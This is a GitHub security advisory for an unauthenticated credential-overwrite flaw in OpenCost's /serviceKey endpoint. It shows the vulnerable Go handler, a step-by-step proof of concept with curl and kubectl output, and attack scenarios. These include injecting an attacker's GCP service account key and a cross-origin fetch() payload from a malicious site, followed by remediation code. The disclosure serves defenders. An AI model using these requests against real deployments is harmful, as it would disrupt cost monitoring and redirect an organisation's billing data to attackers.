# [H] OpenCost ServiceKey Endpoint Unauthorized Credential Overwrite/Injection

## Summary
Severity: High
Advisory: GHSA-wmj8-9953-vff5
CVE: CVE-2026-44300
CWE: CWE-20, CWE-309
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-wmj8-9953-vff5
Type: github-advisory

## Affected
- Go: `github.com/opencost/opencost` — affected >=0 <1.119.1

## Details
## Summary

OpenCost contains an unauthenticated  file write vulnerability in the `/serviceKey` endpoint that allows remote attackers to overwrite the GCP service account key file without authentication. This can lead to service disruption, credential theft, and potential privilege escalation within Kubernetes clusters.

---


## Affected Versions

- **OpenCost**: All versions up to and including the latest release
- **Vulnerable File**: `pkg/costmodel/router.go` (lines 365-379)
- **Vulnerable Endpoint**: `POST /serviceKey`

---

## Vulnerability Details

### Root Cause

The `AddServiceKey` function in `pkg/costmodel/router.go` accepts user-supplied data via POST request and writes it directly to a file without any authentication or input validation:

```go
func (a *Accesses) AddServiceKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
    w.Header().Set("Content-Type", "application/json")
    w.Header().Set("Access-Control-Allow-Origin", "*")  // Overly permissive CORS

    r.ParseForm()

    key := r.PostForm.Get("key")  // User-controlled input, no validation
    k := []byte(key)
    err := os.WriteFile(env.GetGCPAuthSecretFilePath(), k, 0644)  //  Direct file write
    if err != nil {
        fmt.Fprintf(w, "Error writing service key: %s", err)
    }

    w.WriteHeader(http.StatusOK)
}
```

**File Path Determination** (`core/pkg/env/core.go`):
```go
func GetGCPAuthSecretFilePath() string {
    return GetPathFromConfig("key.json")
}

func GetPathFromConfig(fileName string) string {
    return filepath.Join(GetConfigPath(), fileName)
}

func GetConfigPath() string {
    return Get(ConfigPathEnvVar, DefaultConfigPath)  // Default: /var/configs
}
```

### Security Issues

1. **No Authentication**: Any network-accessible client can invoke the endpoint
2. **No Input Validation**: User input is not validated as a valid GCP service account key
3. **Overly Permissive CORS**: `Access-Control-Allow-Origin: *` allows cross-origin attacks
4. **Predictable File Path**: File location controlled by `CONFIG_PATH` environment variable

---

## Proof of Concept

### Environment Setup

#### Prerequisites
- Kubernetes cluster (tested on kind v1.30.0)
- Helm 3.x
- kubectl configured

#### Step 1: Create Namespace

```bash
kubectl create namespace opencost
```

**Output**:
```
namespace/opencost created
```

#### Step 2: Add OpenCost Helm Repository

```bash
helm repo add opencost https://opencost.github.io/opencost-helm-chart
helm repo update
```

**Output**:
```
"opencost" has been added to your repositories
Hang tight while we grab the latest from your chart repositories...
...Successfully got an update from the "opencost" chart repository
Update Complete. Happy Helming!
```

#### Step 3: Deploy OpenCost

```bash
helm install opencost opencost/opencost --namespace opencost \
  --set opencost.exporter.defaultClusterId=test-cluster \
  --set opencost.prometheus.internal.enabled=true \
  --set opencost.prometheus.internal.serviceName=kube-prometheus-stack-prometheus \
  --set opencost.prometheus.internal.namespaceName=monitoring \
  --set opencost.prometheus.internal.port=9090 \
  --set-string 'opencost.exporter.extraEnv.CONFIG_PATH=/tmp'
```

**Key Configuration**:
- `CONFIG_PATH=/tmp`: Sets writable directory for file operations

**Output**:
```
NAME: opencost
LAST DEPLOYED: Sun Jan 18 00:39:21 2026
NAMESPACE: opencost
STATUS: deployed
REVISION: 1
```

#### Step 4: Verify Deployment

```bash
kubectl get pods -l app.kubernetes.io/instance=opencost -n opencost
```

**Output**:
```
NAME                      READY   STATUS    RESTARTS   AGE
opencost-db97bbcc-5q8cb   2/2     Running   0          44s
```

#### Step 5: Verify Service Accessibility

```bash
kubectl run curl-test --image=curlimages/curl --rm -i --restart=Never -- \
  curl -v http://opencost.opencost.svc.cluster.local:9003/healthz
```

**Output**:
```
< HTTP/1.1 200 OK
< Vary: Origin
< Date: Sat, 17 Jan 2026 16:32:07 GMT
< Content-Length: 0
```

### Exploitation

#### Step 6: Check Initial State

```bash
kubectl exec -n opencost opencost-db97bbcc-5q8cb -c opencost -- cat /tmp/key.json
```

**Output**:
```
cat: can't open '/tmp/key.json': No such file or directory
```

Note: File does not exist initially

#### Step 7: Verify CONFIG_PATH Configuration

```bash
kubectl exec -n opencost opencost-db97bbcc-5q8cb -c opencost -- env | grep CONFIG_PATH
```

**Output**:
```
CONFIG_PATH=/tmp
```

Note: CONFIG_PATH correctly set to /tmp

#### Step 8: Execute Exploit

```bash
MALICIOUS_CONTENT='{"type":"VULNERABILITY_PROOF","vuln_id":"VUL-002","timestamp":"2026-01-18T00:41:00Z","message":"Arbitrary file write without authentication - SUCCESSFUL","injected_by":"security_researcher","evidence":"This proves the vulnerability exists"}'

kubectl run vuln-exploit --image=curlimages/curl --rm -i --restart=Never -- \
  curl -X POST http://opencost.opencost.svc.cluster.local:9003/serviceKey \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "key=${MALICIOUS_CONTENT}" \
  -v
```

**Request Details**:
```
> POST /serviceKey HTTP/1.1
> Host: opencost.opencost.svc.cluster.local:9003
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 244
```

**Response Details**:
```
< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: *
< Content-Type: application/json
< Vary: Origin
< Date: Sat, 17 Jan 2026 16:42:29 GMT
< Content-Length: 0
```

Result: HTTP 200 OK - Request successful without authentication

#### Step 9: Verify File Write

```bash
kubectl exec -n opencost opencost-db97bbcc-5q8cb -c opencost -- cat /tmp/key.json
```

**Output**:
```json
{"type":"VULNERABILITY_PROOF","vuln_id":"VUL-002","timestamp":"2026-01-18T00:41:00Z","message":"Arbitrary file write without authentication - SUCCESSFUL","injected_by":"security_researcher","evidence":"This proves the vulnerability exists"}
```

Result: VULNERABILITY CONFIRMED - Malicious content successfully written to file

---

## Impact Analysis

### Direct Impact

| Impact Type | Severity | Description |
|------------|----------|-------------|
| **Unauthorized Credential Overwrite** | High | Attacker can overwrite GCP service account key file content |
| **No Authentication Required** | High | Vulnerability can be exploited without any credentials |
| **CORS Misconfiguration** | Medium | Allows cross-origin attacks via malicious websites |
| **Fixed File Path** | Low | Attacker cannot control write location, only content |

### Attack Scenario Analysis

#### Scenario 1: GCP Credential Overwrite Leading to Service Disruption

**Attack Steps**:
1. Attacker sends POST request with invalid JSON or malformed GCP key
2. `/serviceKey` endpoint accepts request and overwrites existing `key.json` file
3. OpenCost attempts to access GCP API with corrupted credentials
4. GCP integration fails, cost data collection stops

**Technical Details**:
```bash
# Attack payload example
curl -X POST http://opencost:9003/serviceKey \
  -d 'key={"invalid":"json","corrupted":"credentials"}'
```

**Impact**:
- **Cost Monitoring Disruption**: Unable to retrieve GCP cloud cost data
- **Operational Impact**: FinOps processes dependent on cost data are blocked
- **Availability Degradation**: Manual intervention required to restore correct credentials

**CVSS Impact Score**: Availability impact is Low (A:L)

---

#### Scenario 2: Malicious Credential Injection for Data Hijacking

**Attack Steps**:
1. Attacker creates their own GCP project and service account
2. Injects attacker-controlled valid GCP credentials into OpenCost
3. OpenCost uses attacker's credentials to send requests to GCP Billing API
4. Target organization's cost data is sent to attacker's GCP project

**Technical Details**:
```bash
# Inject attacker credentials
ATTACKER_KEY='{
  "type": "service_account",
  "project_id": "attacker-billing-project",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "opencost-hijack@attacker-project.iam.gserviceaccount.com"
}'

curl -X POST http://opencost:9003/serviceKey -d "key=${ATTACKER_KEY}"
```

**Impact**:
- **Sensitive Data Leakage**: Organization's cloud resource usage patterns and cost details
- **Business Intelligence Leakage**: Can infer business scale, growth trends, technology stack
- **Compliance Risk**: Cost data may contain protected business information

**Data Leakage Examples**:
- Kubernetes cluster size and node configuration
- Resource consumption per namespace (can map to business units)
- Cloud service usage patterns (databases, storage, compute instance types)
- Cost trends (can infer business growth or contraction)

**CVSS Impact Score**: Confidentiality impact is None (C:N), but business impact is High

---

#### Scenario 3: Cross-Origin Attack (CORS Exploitation)

**Attack Steps**:
1. User visits attacker-controlled malicious website
2. Malicious JavaScript sends POST request to `http://localhost:9003/serviceKey`
3. Due to CORS set to `*`, browser allows cross-origin request
4. User's browser acts as proxy to execute credential overwrite attack

**Prerequisites**:
- User exposes OpenCost service via `kubectl port-forward` or other means
- User's browser can access OpenCost endpoint

**Technical Details**:
```javascript
// JavaScript on malicious website
fetch('http://localhost:9003/serviceKey', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'key={"type":"malicious"}'
});
```

**Impact**:
- **User-Unaware Attack**: No active user interaction required
- **Difficult to Trace**: Attack originates from victim's IP address
- **Limited Exploitation Conditions**: Requires OpenCost exposed to user-accessible network

---

### Vulnerability Limitations

**What Attacker Cannot Control**:
- **File Write Path**: Fixed by `CONFIG_PATH` environment variable, attacker cannot modify
- **File Name**: Fixed as `key.json`, cannot write to other files
- **File Permissions**: Write permission is `0644`, attacker cannot escalate

**Actual Attack Capabilities**:
- **File Content Control**: Complete control over `key.json` content
- **Unauthenticated Exploitation**: No credentials required to trigger
- **Remote Accessibility**: Can be exploited over network (if service exposed)

---

### Real-World Impact Assessment

| Deployment Scenario | Risk Level | Description |
|---------------------|-----------|-------------|
| **Cluster-Internal Only** | Medium | Requires attacker to have cluster network access |
| **Exposed via Ingress** | High | Any internet user can exploit |
| **Exposed via NodePort** | High | Attackers with node network access can exploit |
| **Via port-forward** | Medium-High | Local dev environments vulnerable to CORS attacks |

**Recommended Risk Rating**:
- Default deployment (cluster-internal): **Medium**
- Improperly exposed (public internet): **High**

---

## Remediation

### Immediate Actions (P0)

#### 1. Add Authentication

```go
func (a *Accesses) AddServiceKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
    // Add authentication check
    if !a.isAuthorized(r) {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }

    // ... existing logic
}
```

#### 2. Implement Input Validation

```go
func validateServiceKey(key string) error {
    var keyData map[string]interface{}
    if err := json.Unmarshal([]byte(key), &keyData); err != nil {
        return fmt.Errorf("invalid JSON format")
    }

    requiredFields := []string{"type", "project_id", "private_key_id", "private_key"}
    for _, field := range requiredFields {
        if _, ok := keyData[field]; !ok {
            return fmt.Errorf("missing required field: %s", field)
        }
    }

    if keyData["type"] != "service_account" {
        return fmt.Errorf("invalid key type")
    }

    return nil
}
```

#### 3. Restrict CORS

```go
w.Header().Set("Access-Control-Allow-Origin", os.Getenv("ALLOWED_ORIGIN"))
```

### Long-term Solutions (P1)

1. **Use Kubernetes Secrets**: Store credentials in Kubernetes Secrets instead of files
2. **Implement RBAC**: Role-based access control for sensitive operations
3. **Add Audit Logging**: Log all file write operations
4. **Apply Least Privilege**: Minimize ClusterRole permissions

---

## Workarounds

Until a patch is available, implement these mitigations:

1. **Network Segmentation**: Restrict access to OpenCost service using NetworkPolicies
2. **Disable Endpoint**: Remove or disable the `/serviceKey` endpoint if not required
3. **Monitor File Changes**: Alert on modifications to `key.json` file
4. **Use Read-only Filesystem**: Mount config directory as read-only where possible

---

## References

- **Vulnerable Code**: `pkg/costmodel/router.go:365-379`
- **Environment Configuration**: `core/pkg/env/core.go`
- **OWASP**: [Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **CWE-306**: [Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- **CWE-20**: [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

## References
- https://github.com/opencost/opencost/security/advisories/GHSA-wmj8-9953-vff5
- https://github.com/opencost/opencost
